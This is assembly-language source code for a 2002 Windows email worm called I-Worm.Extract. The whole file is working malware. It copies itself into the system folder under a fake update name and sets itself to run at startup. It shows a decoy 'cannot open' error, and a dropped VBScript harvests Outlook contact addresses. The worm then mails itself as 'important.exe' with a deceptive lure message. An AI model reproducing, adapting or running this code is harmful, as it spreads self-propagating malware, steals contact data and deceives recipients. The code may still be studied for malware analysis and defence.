comment #
Name : I-Worm.Extract
Author : PetiK
Date : February 3rd 2002 - February 4th 2002
Size : 5632

Action :
#

.586p
.model flat
.code

JUMPS

api macro a
extrn a:proc
call a
endm

include Useful.inc
include myinclude.inc

start_worm:
	@pushsz "KERNEL32.DLL"
	api	GetModuleHandleA
	xchg	eax,ebx

kern	macro x
	push	offset sz&x
	push	ebx
	api	GetProcAddress
	mov	_ptk&x,eax
	endm

	kern	CloseHandle
	kern	CopyFileA
	kern	CreateDirectoryA
	kern	CreateFileA
	kern	CreateFileMappingA
	kern	DeleteFileA
	kern	GetDateFormatA
	kern	GetFileSize
	kern	GetModuleFileNameA
	kern	GetSystemDirectoryA
	kern	GetSystemTime
	kern	GetTimeFormatA
	kern	GetWindowsDirectoryA
	kern	lstrcat
	kern	lstrcmp
	kern	lstrcpy
	kern	lstrlen
	kern	MapViewOfFile
	kern	SetCurrentDirectoryA
	kern	Sleep
	kern	UnmapViewOfFile
	kern	WinExec
	kern	WriteFile
	kern	WriteProfileStringA
	kern	WritePrivateProfileStringA


	push	50
	mov	esi,offset orig_worm
	push	esi
	push	0
	call	_ptkGetModuleFileNameA

	push	50
	push	offset verif_worm
	call	_ptkGetSystemDirectoryA
	@pushsz "\UPDATEW32.EXE"
	push	offset verif_worm
	call	_ptklstrcat

	push	esi
	push	offset verif_worm
	call	_ptklstrcmp
	test	eax,eax
	jz	continue_worm

	mov	edi,offset copy_worm
	push	edi
	push	50
	push	edi
	call	_ptkGetSystemDirectoryA
	add	edi,eax
	mov	eax,"dpU\"
	stosd
	mov	eax,"Weta"
	stosd
	mov	eax,"e.23"
	stosd
	mov	eax,"ex"
	stosd
	pop	edi

copy_w:	push	0
	push	edi
	push	esi
	call	_ptkCopyFileA

run_w:	push	edi
	@pushsz "RUN"
	@pushsz "WINDOWS"
	call	_ptkWriteProfileStringA

	call	CreateDate
	push	50
	push	offset realname
	push	offset orig_worm
	api	GetFileTitleA

	@pushsz " - "
	push	offset date
	call	_ptklstrcat
	push	offset realname
	push	offset date
	call	_ptklstrcat

f_mess:	push	10h
	push	offset date
	call	@mess
	db	"Cannot Open this File !",CRLF,CRLF
	db	"If you downloaded this file, try downloading again.",0
	@mess:
	push	0
	api	MessageBoxA
	jmp	end_worm

continue_worm:
	push	50
	push	offset vbsfile
	call	_ptkGetWindowsDirectoryA
	@pushsz "\ExtractVbs.vbs"
	push	offset vbsfile
	call	_ptklstrcat

	push	0
	push	20h
	push	2
	push	0
	push	1
	push	40000000h
	push	offset vbsfile
	call	_ptkCreateFileA
	xchg	eax,ebx
	push	0
	push	offset octets
	push	e_vbs - s_vbs
	push	offset s_vbs
	push	ebx
	call	_ptkWriteFile
	push	ebx
	call	_ptkCloseHandle

	push	offset vbsfile
	push	offset vbsexec
	call	_ptklstrcpy
	push	4
	push	offset execcontrol
	call	_ptkWinExec
	push	5000
	call	_ptkSleep
	push	offset vbsfile
	call	_ptkDeleteFileA

payload:
	push	offset Systime
	call	_ptkGetSystemTime
	cmp	[Systime.wDay],29
	jne	end_pay
	push	40h
	@pushsz "I-Worm.Extract"
	call	e_mess
	db	"Hi man, you received my worm !",CRLF
	db	"Don't panic, it doesn't format your computer",CRLF,CRLF
	db	9,"Bye and Have a Nice Day.",0
	e_mess:
	push	0
	api	MessageBoxA
end_pay:

sh_gsf:	push	0
	push	5
	push	offset progra
	push	0
	api	SHGetSpecialFolderPathA
	push	offset progra
	call	_ptkSetCurrentDirectoryA
	@pushsz "Update Windows 32bits"
	call	_ptkCreateDirectoryA
	@pushsz "\Update Windows 32bits"
	push	offset progra
	call	_ptklstrcat
	push	offset progra
	call	_ptkSetCurrentDirectoryA
	push	0
	@pushsz "MAJ.exe"
	push	offset orig_worm
	call	_ptkCopyFileA

verif_inet:
	push	0
	push	offset inet
	api	InternetGetConnectedState
	dec	eax
	jnz	verif_inet

	push	50
	push	offset winpath
	call	_ptkGetWindowsDirectoryA
	push	offset winpath
	call	_ptkSetCurrentDirectoryA

spread:	pushad
	push	00h
	push	80h
	push	03h
	push	00h
	push	01h
	push	80000000h
	@pushsz "Outlook_Addr.txt"
	call	_ptkCreateFileA
	inc	eax
	je	end_spread
	dec	eax
	xchg	eax,ebx

	xor	eax,eax
	push	eax
	push	eax
	push	eax
	push	2
	push	eax
	push	ebx
	call	_ptkCreateFileMappingA
	test	eax,eax
	je	end_s1
	xchg	eax,ebp

	xor	eax,eax
	push	eax
	push	eax
	push	eax
	push	4
	push	ebp
	call	_ptkMapViewOfFile
	test	eax,eax
	je	end_s2
	xchg	eax,esi

	push	0
	push	ebx
	call	_ptkGetFileSize
	cmp	eax,4
	jbe	end_s3

scan_mail:
	xor	edx,edx
	mov	edi,offset mail_addr
	push	edi
	p_c:	lodsb
	cmp	al," "
	je	car_s
	cmp	al,";"
	je	end_m
	cmp	al,"#"
	je	f_mail
	cmp	al,'@'
	jne	not_a
	inc	edx
	not_a:	stosb
		jmp p_c
	car_s:	inc esi
		jmp p_c
	end_m:	xor al,al
		stosb
		pop edi
		test edx,edx
		je  scan_mail
		call send_mail
		jmp scan_mail
	f_mail:

end_s3:	push	esi
	call	_ptkUnmapViewOfFile
end_s2:	push	ebp
	call	_ptkCloseHandle
end_s1:	push	ebx
	call	_ptkCloseHandle
end_spread: popad

end_worm:
	push	0
	api	ExitProcess

send_mail:
	call	CreateDate
	call	CreateTime
	@pushsz "C:\liste.ini"
	push	offset mail_addr
	push	offset time
	push	offset date
	call	_ptkWritePrivateProfileStringA

	xor	eax,eax
	push	eax
	push	eax
	push	offset Message
	push	eax
	push	[sess]
	api	MAPISendMail
	ret

CreateDate Proc
	pushad
	mov	edi,offset date
	push	32
	push	edi
	@pushsz	"dddd, dd MMMM yyyy"
	push	0
	push	0
	push	9
	call	_ptkGetDateFormatA
	popad
	ret
CreateDate EndP
CreateTime Proc
	pushad
	mov	edi,offset time
	push	32
	push	edi
	@pushsz	"HH:mm:ss"
	push	0
	push	0
	push	9
	call	_ptkGetTimeFormatA
	popad
	ret
CreateTime EndP


.data
copy_worm	db 50 dup (0)
orig_worm	db 50 dup (0)
verif_worm	db 50 dup (0)
vbsfile		db 50 dup (0)
winpath		db 50 dup (0)
progra		db 50 dup (0)
mail_addr	db 128 dup (?)
realname	db 50 dup (0)
date		db 30 dup (?)
time		db 9 dup (?)
octets		dd ?
inet		dd 0
sess		dd 0

subject		db "Re: Check This...",0
body		db "Hi",CRLF
		db "This is the file you ask for. Open quickly ! It's very important",CRLF,CRLF
		db 9,"Best Regards",CRLF,CRLF,CRLF
		db "Salut,",CRLF
		db "Voici le fichier que tu cherches. Ouvre vite ! C'est très important",CRLF,CRLF
		db 9,"Mes sincères salutations",0
filename	db "important.exe",0

Message		dd ?
		dd offset subject
		dd offset body
		dd ?
		dd ?
		dd ?
		dd 2
		dd offset MsgFrom
		dd 1
		dd offset MsgTo
		dd 1
		dd offset Attach

MsgFrom		dd ?
		dd ?
		dd ?
		dd ?
		dd ?
		dd ?

MsgTo		dd ?
		dd 1
		dd offset mail_addr
		dd offset mail_addr
		dd ?
		dd ?

Attach		dd ?
		dd ?
		dd ?
		dd offset orig_worm
		dd offset filename
		dd ?

szCloseHandle			db "CloseHandle",0
szCopyFileA			db "CopyFileA",0
szCreateDirectoryA		db "CreateDirectoryA",0
szCreateFileA			db "CreateFileA",0
szCreateFileMappingA		db "CreateFileMappingA",0
szDeleteFileA			db "DeleteFileA",0
szGetDateFormatA		db "GetDateFormatA",0
szGetFileSize			db "GetFileSize",0
szGetModuleFileNameA		db "GetModuleFileNameA",0
szGetSystemDirectoryA		db "GetSystemDirectoryA",0
szGetSystemTime			db "GetSystemTime",0
szGetTimeFormatA		db "GetTimeFormatA",0
szGetWindowsDirectoryA		db "GetWindowsDirectoryA",0
szlstrcat			db "lstrcat",0
szlstrcmp			db "lstrcmp",0
szlstrcpy			db "lstrcpy",0
szlstrlen			db "lstrlen",0
szMapViewOfFile			db "MapViewOfFile",0
szSetCurrentDirectoryA		db "SetCurrentDirectoryA",0
szSleep				db "Sleep",0
szUnmapViewOfFile		db "UnmapViewOfFile",0
szWinExec			db "WinExec",0
szWriteFile			db "WriteFile",0
szWritePrivateProfileStringA	db "WritePrivateProfileStringA",0
szWriteProfileStringA	  	db "WriteProfileStringA",0

_ptkCloseHandle			dd ?
_ptkCopyFileA			dd ?
_ptkCreateDirectoryA		dd ?
_ptkCreateFileA			dd ?
_ptkCreateFileMappingA		dd ?
_ptkDeleteFileA			dd ?
_ptkGetDateFormatA		dd ?
_ptkGetFileSize			dd ?
_ptkGetModuleFileNameA		dd ?
_ptkGetSystemDirectoryA		dd ?
_ptkGetSystemTime		dd ?
_ptkGetTimeFormatA		dd ?
_ptkGetWindowsDirectoryA	dd ?
_ptklstrcat			dd ?
_ptklstrcmp			dd ?
_ptklstrcpy			dd ?
_ptklstrlen			dd ?
_ptkMapViewOfFile		dd ?
_ptkSetCurrentDirectoryA	dd ?
_ptkSleep			dd ?
_ptkUnmapViewOfFile		dd ?
_ptkWinExec			dd ?
_ptkWriteFile			dd ?
_ptkWriteProfileStringA 	dd ?
_ptkWritePrivateProfileStringA	dd ?

s_vbs:	db 'On Error Resume Next',CRLF
	db 'Set f=CreateObject("Scripting.FileSystemObject")',CRLF
	db 'Set win=f.GetSpecialFolder(0)',CRLF
	db 'Set c=f.CreateTextFile(win&"\Outlook_Addr.txt")',CRLF
	db 'c.Close',CRLF
	db 'Set out=CreateObject("Outlook.Application")',CRLF
	db 'Set mapi=out.GetNameSpace("MAPI")',CRLF
	db 'adr="extractcounter@multimania.com"',CRLF
	db 'For Each mail in mapi.AddressLists',CRLF
	db 'If mail.AddressEntries.Count <> 0 Then',CRLF
	db 'For O=1 To mail.AddressEntries.Count',CRLF
	db 'adr=adr &";"& mail.AddressEntries(O).Address',CRLF
	db 'Next',CRLF
	db 'End If',CRLF
	db 'Next',CRLF
	db 'adr=adr &";#"',CRLF,CRLF
	db 'Set c=f.OpenTextFile(win&"\Outlook_Addr.txt",2)',CRLF
	db 'c.WriteLine adr',CRLF
	db 'c.Close',CRLF
e_vbs:

execcontrol	db "wscript "
		vbsexec	db 50 dup (0)
		db "",0

end start_worm
end